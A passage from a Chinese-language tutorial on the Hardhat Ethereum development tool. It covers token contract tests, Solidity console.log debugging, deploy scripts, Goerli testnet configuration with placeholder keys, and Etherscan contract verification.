punctuation">;</span>            <span class="token keyword">const</span> ownerBalance <span class="token operator">=</span> <span class="token keyword">await</span> hardhatToken<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span>owner<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">expect</span><span class="token punctuation">(</span><span class="token keyword">await</span> hardhatToken<span class="token punctuation">.</span><span class="token function">totalSupply</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">.</span><span class="token function">equal</span><span class="token punctuation">(</span>ownerBalance<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">describe</span><span class="token punctuation">(</span><span class="token string">"Transactions"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">it</span><span class="token punctuation">(</span><span class="token string">"Should transfer tokens between accounts"</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> hardhatToken<span class="token punctuation">,</span> owner<span class="token punctuation">,</span> addr1<span class="token punctuation">,</span> addr2 <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">loadFixture</span><span class="token punctuation">(</span>                deployTokenFixture            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// Transfer 50 tokens from owner to addr1</span>            <span class="token keyword">await</span> <span class="token function">expect</span><span class="token punctuation">(</span>                hardhatToken<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>addr1<span class="token punctuation">.</span>address<span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">.</span><span class="token function">changeTokenBalances</span><span class="token punctuation">(</span>hardhatToken<span class="token punctuation">,</span> <span class="token punctuation">[</span>owner<span class="token punctuation">,</span> addr1<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// Transfer 50 tokens from addr1 to addr2</span>            <span class="token comment">// We use .connect(signer) to send a transaction from another account</span>            <span class="token keyword">await</span> <span class="token function">expect</span><span class="token punctuation">(</span>                hardhatToken<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span>addr1<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>addr2<span class="token punctuation">.</span>address<span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">.</span><span class="token function">changeTokenBalances</span><span class="token punctuation">(</span>hardhatToken<span class="token punctuation">,</span> <span class="token punctuation">[</span>addr1<span class="token punctuation">,</span> addr2<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">it</span><span class="token punctuation">(</span><span class="token string">"should emit Transfer events"</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> hardhatToken<span class="token punctuation">,</span> owner<span class="token punctuation">,</span> addr1<span class="token punctuation">,</span> addr2 <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">loadFixture</span><span class="token punctuation">(</span>                deployTokenFixture            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// Transfer 50 tokens from owner to addr1</span>            <span class="token keyword">await</span> <span class="token function">expect</span><span class="token punctuation">(</span>hardhatToken<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>addr1<span class="token punctuation">.</span>address<span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span>to<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span>hardhatToken<span class="token punctuation">,</span> <span class="token string">"Transfer"</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">withArgs</span><span class="token punctuation">(</span>owner<span class="token punctuation">.</span>address<span class="token punctuation">,</span> addr1<span class="token punctuation">.</span>address<span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// Transfer 50 tokens from addr1 to addr2</span>            <span class="token comment">// We use .connect(signer) to send a transaction from another account</span>            <span class="token keyword">await</span> <span class="token function">expect</span><span class="token punctuation">(</span>hardhatToken<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span>addr1<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>addr2<span class="token punctuation">.</span>address<span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span>to<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span>hardhatToken<span class="token punctuation">,</span> <span class="token string">"Transfer"</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">withArgs</span><span class="token punctuation">(</span>addr1<span class="token punctuation">.</span>address<span class="token punctuation">,</span> addr2<span class="token punctuation">.</span>address<span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">it</span><span class="token punctuation">(</span><span class="token string">"Should fail if sender doesn't have enough tokens"</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> hardhatToken<span class="token punctuation">,</span> owner<span class="token punctuation">,</span> addr1 <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">loadFixture</span><span class="token punctuation">(</span>                deployTokenFixture            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">const</span> initialOwnerBalance <span class="token operator">=</span> <span class="token keyword">await</span> hardhatToken<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span>owner<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// Try to send 1 token from addr1 (0 tokens) to owner (1000 tokens).</span>            <span class="token comment">// `require` will evaluate false and revert the transaction.</span>            <span class="token keyword">await</span> <span class="token function">expect</span><span class="token punctuation">(</span>                hardhatToken<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span>addr1<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>owner<span class="token punctuation">.</span>address<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">.</span>be<span class="token punctuation">.</span><span class="token function">revertedWith</span><span class="token punctuation">(</span><span class="token string">"Not enough tokens"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// Owner balance shouldn't have changed.</span>            <span class="token function">expect</span><span class="token punctuation">(</span><span class="token keyword">await</span> hardhatToken<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span>owner<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">.</span><span class="token function">equal</span><span class="token punctuation">(</span>                initialOwnerBalance            <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这是 <code>npx hardhat test</code> 在完整测试套件中的输出：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ npx hardhat <span class="token builtin class-name">test</span>  Token contract    Deployment      ✓ Should <span class="token builtin class-name">set</span> the right owner      ✓ Should assign the total supply of tokens to the owner    Transactions      ✓ Should transfer tokens between accounts <span class="token punctuation">(</span>199ms<span class="token punctuation">)</span>      ✓ Should fail <span class="token keyword">if</span> sender doesn’t have enough tokens      ✓ Should update balances after transfers <span class="token punctuation">(</span>111ms<span class="token punctuation">)</span>  <span class="token number">5</span> passing <span class="token punctuation">(</span>1s<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>请记住，当您运行 <code>npx hardhat test</code> 时，如果您的合约自上次运行测试以来发生更改，则会自动编译它们。</p><h2 id="5-使用-Hardhat-网络-Debug"><a href="#5-使用-Hardhat-网络-Debug" class="headerlink" title="5. 使用 Hardhat 网络 Debug"></a>5. 使用 Hardhat 网络 Debug</h2><p>Hardhat 有内置的 Hardhat 网络，这是一个专为开发而设计的本地以太坊网络。它允许您在本地机器范围内部署合约、运行测试和调试代码。它是 Hardhat 连接的默认网络，因此您无需任何设置即可使其正常工作。直接运行测试就可以了。</p><h3 id="Solidity-console-log"><a href="#Solidity-console-log" class="headerlink" title="Solidity console.log"></a>Solidity <code>console.log</code></h3><p>在 Hardhat Network 上运行合约和测试时，您可以从 Solidity 代码中通过调用 <code>console.log()</code> 来打印日志消息(logging messages)和合约变量。要使用它，您必须在合约代码中导入 <code>hardhat/console.sol</code>。</p><p>类似于：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.9</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"hardhat/console.sol"</span><span class="token punctuation">;</span>  <span class="token comment">// added line</span><span class="token keyword">contract</span> <span class="token class-name">Token</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>然后你可以添加一些 <code>console.log</code> 调用到 <code>transfer()</code> 函数，就好像你在 JavaScript 中使用它一样：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> amount<span class="token punctuation">,</span> <span class="token string">"Not enough tokens"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>        <span class="token string">"Transferring from %s to %s %s tokens"</span><span class="token punctuation">,</span>        msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span>        to<span class="token punctuation">,</span>        amount    <span class="token punctuation">)</span><span class="token punctuation">;</span>    balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> amount<span class="token punctuation">;</span>    balances<span class="token punctuation">[</span>to<span class="token punctuation">]</span> <span class="token operator">+=</span> amount<span class="token punctuation">;</span>    <span class="token keyword">emit</span> <span class="token function">Transfer</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>运行测试时将显示日志记录输出：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ npx hardhat <span class="token builtin class-name">test</span>  Token contract    Deployment      ✓ Should <span class="token builtin class-name">set</span> the right owner      ✓ Should assign the total supply of tokens to the owner    TransactionsTransferring from 0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266 to 0x70997970c51812dc3a010c7d01b50e0d17dc79c8 <span class="token number">50</span> tokensTransferring from 0x70997970c51812dc3a010c7d01b50e0d17dc79c8 to 0x3c44cdddb6a900fa2b585dd299e03d12fa4293bc <span class="token number">50</span> tokens      ✓ Should transfer tokens between accounts <span class="token punctuation">(</span>373ms<span class="token punctuation">)</span>      ✓ Should fail <span class="token keyword">if</span> sender doesn’t have enough tokensTransferring from 0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266 to 0x70997970c51812dc3a010c7d01b50e0d17dc79c8 <span class="token number">50</span> tokensTransferring from 0x70997970c51812dc3a010c7d01b50e0d17dc79c8 to 0x3c44cdddb6a900fa2b585dd299e03d12fa4293bc <span class="token number">50</span> tokens      ✓ Should update balances after transfers <span class="token punctuation">(</span>187ms<span class="token punctuation">)</span>  <span class="token number">5</span> passing <span class="token punctuation">(</span>2s<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>查看<a href="https://hardhat.org/hardhat-network#console.log">文档</a>了解该特性的更多信息。</p><h2 id="6-部署到实时网络"><a href="#6-部署到实时网络" class="headerlink" title="6. 部署到实时网络"></a>6. 部署到实时网络</h2><p>一旦您准备好与其他人共享您的 dApp，您可能希望将其部署到实时(live)网络。这样，其他人就可以访问不在您系统上本地运行的实例。</p><p>“mainnet” 以太坊主网络处理 real money，但测试网络不是这样。这些测试网提供了共享的暂存环境，可以很好地模拟现实世界的场景，而不会危及 real money，以太坊有几个<a href="https://ethereum.org/en/developers/docs/networks/#ethereum-testnets">测试网</a>，比如 <em>Goerli</em> 和 <em>Sepolia</em>。我们建议您将合约部署到 <em>Goerli</em> 测试网。</p><p>在软件层面，部署到测试网与部署到主网相同。唯一的区别是您连接到哪个网络。让我们看看使用 ethers.js 部署合约的代码是什么样的。</p><p>使用的主要概念是我们在测试小节中解释过的 <code>Signer</code>、<code>ContractFactory</code> 和 <code>Contract</code>。与上小节相比，没有什么新的事情需要做，因为当你测试你的合约时，你实际上是在你的开发网络上进行部署。这使得代码非常相似，甚至相同。</p><p>让我们在项目根目录中创建一个新目录 <code>scripts</code>，并将以下内容粘贴到该目录中的 <code>deploy.js</code> 文件中：</p><figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token punctuation">[</span>deployer<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">await</span> ethers<span class="token punctuation">.</span><span class="token function">getSigners</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Deploying contracts with the account:"</span><span class="token punctuation">,</span> deployer<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Account balance:"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">await</span> deployer<span class="token punctuation">.</span><span class="token function">getBalance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> Token <span class="token operator">=</span> <span class="token keyword">await</span> ethers<span class="token punctuation">.</span><span class="token function">getContractFactory</span><span class="token punctuation">(</span><span class="token string">"Token"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> token <span class="token operator">=</span> <span class="token keyword">await</span> Token<span class="token punctuation">.</span><span class="token function">deploy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Token address:"</span><span class="token punctuation">,</span> token<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> process<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>        process<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>要告诉 Hardhat 连接到特定的以太坊网络，您可以在运行任何任务时使用 <code>--network</code> 参数，如下所示：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">npx hardhat run scripts/deploy.js --network <span class="token operator">&lt;</span>network-name<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>使用我们当前的默认配置，在没有 <code>--network</code> 参数的情况下运行它会导致代码在 Hardhat Network 的嵌入实例运行。在这种情况下，当 Hardhat 完成运行时，部署实际上会丢失（多次运行同一个部署脚本后您可能会发现部署的合约地址始终是相同的），但测试我们的部署代码是否有效仍然很有用：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ npx hardhat run scripts/deploy.jsDeploying contracts with the account: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266Account balance: <span class="token number">10000000000000000000000</span>Token address: 0x5FbDB2315678afecb367f032d93F642f64180aa3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>你可以按照下面两步将合约部署到 <code>localhost</code> 网络中：</p><ol><li>启动一个<a href="https://hardhat.org/hardhat-runner/docs/getting-started#connecting-a-wallet-or-dapp-to-hardhat-network">本地节点</a></li></ol><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">npx hardhat <span class="token function">node</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ol start="2"><li>打开一个新的终端，将合约部署到 <code>localhost</code> 网络中</li></ol><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">npx hardhat run scripts/deploy.js --network localhost<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>使用上面的方法，你将会在本地运行一个以太坊节点，并将合约部署到 <code>localhost</code> 网络中。</p><p>实际上，你还可以在本地模拟以太坊主网的节点，并将合约部署到本地模拟的以太坊主网上，进而可以在模拟的主网上测试合约。</p><p>使用 <code>npx hardhat help node</code> 命令你将会看到 <code>npx hardhat node</code> 命令的帮助信息，其中包含：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Usage: hardhat <span class="token punctuation">[</span>GLOBAL OPTIONS<span class="token punctuation">]</span> <span class="token function">node</span> <span class="token punctuation">[</span>--fork <span class="token operator">&lt;</span>STRING<span class="token operator">></span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--fork-block-number <span class="token operator">&lt;</span>INT<span class="token operator">></span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--hostname <span class="token operator">&lt;</span>STRING<span class="token operator">></span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--port <span class="token operator">&lt;</span>INT<span class="token operator">></span><span class="token punctuation">]</span>OPTIONS:  --fork                The URL of the JSON-RPC server to fork from  --fork-block-number   The block number to fork from  --hostname            The <span class="token function">host</span> to <span class="token function">which</span> to <span class="token builtin class-name">bind</span> to <span class="token keyword">for</span> new connections <span class="token punctuation">(</span>Defaults to <span class="token number">127.0</span>.0.1 running locally, and <span class="token number">0.0</span>.0.0 <span class="token keyword">in</span> Docker<span class="token punctuation">)</span>  --port                The port on <span class="token function">which</span> to listen <span class="token keyword">for</span> new connections <span class="token punctuation">(</span>default: <span class="token number">8545</span><span class="token punctuation">)</span>node: Starts a JSON-RPC server on <span class="token function">top</span> of Hardhat Network<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>也就是说，通过设置 <code>--fork</code> 和 <code>--fork-block-number</code> 选项，你可以在本地模拟以太坊主网任意一个区块，进而可以复现主网上某一时刻的历史状态。其中，<code>--fork</code> 选项的参数类似于 <code>https://eth-mainnet.alchemyapi.io/v2/ALCHEMY_API_KEY</code>。</p><h3 id="部署到远程网络"><a href="#部署到远程网络" class="headerlink" title="部署到远程网络"></a>部署到远程网络</h3><p>要部署到远程网络(例如主网或任何测试网)，您需要将 <code>network</code> 条目添加到您的 <code>hardhat.config.js</code> 文件中。我们将在此示例中使用 Goerli，但您可以类似地添加任何网络：</p><figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"@nomicfoundation/hardhat-toolbox"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Go to https://www.alchemyapi.io, sign up, create</span><span class="token comment">// a new App in its dashboard, and replace "KEY" with its key</span><span class="token keyword">const</span> <span class="token constant">ALCHEMY_API_KEY</span> <span class="token operator">=</span> <span class="token string">"KEY"</span><span class="token punctuation">;</span><span class="token comment">// Replace this private key with your Goerli account private key</span><span class="token comment">// To export your private key from Metamask, open Metamask and</span><span class="token comment">// go to Account Details > Export Private Key</span><span class="token comment">// Beware: NEVER put real Ether into testing accounts</span><span class="token keyword">const</span> <span class="token constant">GOERLI_PRIVATE_KEY</span> <span class="token operator">=</span> <span class="token string">"YOUR GOERLI PRIVATE KEY"</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">solidity</span><span class="token operator">:</span> <span class="token string">"0.8.9"</span><span class="token punctuation">,</span>    <span class="token literal-property property">networks</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">goerli</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">https://eth-goerli.alchemyapi.io/v2/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">ALCHEMY_API_KEY</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>            <span class="token literal-property property">accounts</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token constant">GOERLI_PRIVATE_KEY</span><span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>我们目前正在使用 <a href="https://www.alchemyapi.io/">Alchemy</a>，但将 <code>url</code> 指向任何以太坊节点或网关都可以。到 Alchemy 官网去获取你的 <code>ALCHEMY_API_KEY</code> 然后回来设置。</p><p>要在 Goerli 上部署，您需要将一些 Goerli ether 发送到将要进行部署的地址。您可以从水龙头中获取测试网以太币，这是一种免费分发测试以太币的服务。 Goerli 有几个水龙头：</p><ul><li><a href="https://faucets.chain.link/">Chainlink faucet</a></li><li><a href="https://goerlifaucet.com/">Alchemy Goerli Faucet</a></li></ul><p>在进行交易之前，您必须将 Metamask 的网络更改为 Goerli。</p><p>您可以在 <a href="https://ethereum.org/en/developers/docs/networks/#ethereum-testnets">ethereum.org</a> 网站上了解有关其他测试网的更多信息并找到指向其水龙头的链接。</p><p>最后，运行：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">npx hardhat run scripts/deploy.js --network georli<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>如果一切顺利，您应该会看到已部署的合约地址。</p><h2 id="7-验证合约"><a href="#7-验证合约" class="headerlink" title="7. 验证合约"></a>7. 验证合约</h2><p>验证合约意味着公开其源代码以及您使用的编译器设置，这允许任何人编译它并将生成的字节码与部署在链上的字节码进行比较。在像以太坊这样的开放平台中，​​这样做非常重要。</p><p>在本小节中将会介绍如何在 <a href="https://etherscan.io/">Etherscan</a> 浏览器中验证合约，但还有其他方法可以验证合约，例如使用 <a href="https://sourcify.dev/">Sourcify</a>。</p><h3 id="从-Etherscan-获取-API-key"><a href="#从-Etherscan-获取-API-key" class="headerlink" title="从 Etherscan 获取 API key"></a>从 Etherscan 获取 API key</h3><p>您需要的第一件事是从 Etherscan 获取 API key。想要获取，请访问 <a href="https://etherscan.io/login">Etherscan</a>，登录（如果没有，请创建一个帐户）并打开“API key”选项。然后单击“Add”按钮并为您正在创建的 API key 命名（如“Hardhat”）。之后，您将在列表中看到新创建的密钥。</p><p>打开您的 Hardhat config 并添加您刚刚创建的 API key。在 Goerli 测试网上验证合约也需要添加对应的以太坊浏览器的 API key。</p><figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// ...rest of the config...</span>    <span class="token literal-property property">etherscan</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">apiKey</span><span class="token operator">:</span> <span class="token string">"ABCDE12345ABCDE12345ABCDE123456789"</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="在-Goerli-测试网上验证合约"><a href="#在-Goerli-测试网上验证合约" class="headerlink" title="在 Goerli 测试网上验证合约"></a>在 Goerli 测试网上验证合约</h3><p>在上一节中已经给出了将合约部署到 Goerli 测试网上的方法。</p><p>记录下地址和解锁时间，并使用它们运行 <code>verify</code> 任务：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">npx hardhat verify --network goerli <span class="token operator">&lt;</span>address<span class="token operator">></span> <span class="token operator">&lt;</span>unlock time<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><blockquote><p>TIP：如果您收到一条错误消息，指出该地址没有字节码，这可能意味着 Etherscan 